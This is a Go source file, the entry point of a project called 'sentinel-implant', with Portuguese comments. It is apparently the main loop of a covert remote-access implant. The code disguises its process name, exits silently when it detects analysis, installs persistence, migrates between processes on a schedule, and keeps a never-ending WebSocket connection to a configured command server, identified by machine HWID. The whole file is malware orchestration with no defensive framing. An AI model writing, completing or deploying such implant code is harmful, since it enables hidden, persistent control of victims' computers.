package main

import (
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"

	"sentinel-implant/config"
	"sentinel-implant/core/connection"
	"sentinel-implant/core/identity"
	"sentinel-implant/stealth"
)

func init() {
	// Inicializar seed do random para jitter
	rand.Seed(time.Now().UnixNano())
}

func main() {
	// 0. PRIMEIRA COISA: Garantir nome legítimo do processo
	// Se o executável se chama "sentinel.exe", renomeia e reinicia
	stealth.EnsureLegitimateProcessName()

	// 1. Garantir apenas uma instância rodando
	if !stealth.EnsureSingleInstance() {
		// Já existe outra instância, sair silenciosamente
		os.Exit(0)
	}

	// 2. Verificar ambiente (anti-análise)
	if !stealth.IsEnvironmentSafe() {
		// Sair silenciosamente se detectar análise
		os.Exit(0)
	}

	// 3. Obter HWID único da máquina
	hwid := identity.GetHWID()

	// 4. Instalar persistência
	_ = stealth.InstallPersistence()

	// 5. Iniciar scheduler de migração periódica
	migrationScheduler := stealth.NewMigrationScheduler()
	migrationScheduler.Start()
	defer migrationScheduler.Stop()

	// 6. Criar cliente WebSocket
	client := connection.NewClient(
		config.Current.ServerURL,
		config.Current.PSK,
		hwid,
	)

	// 7. Capturar sinais para graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		migrationScheduler.Stop()
		client.Close()
		os.Exit(0)
	}()

	// 8. Rodar loop infinito de conexão/reconexão
	// NOTA: Este loop NUNCA deve terminar em produção
	client.RunForever()
}
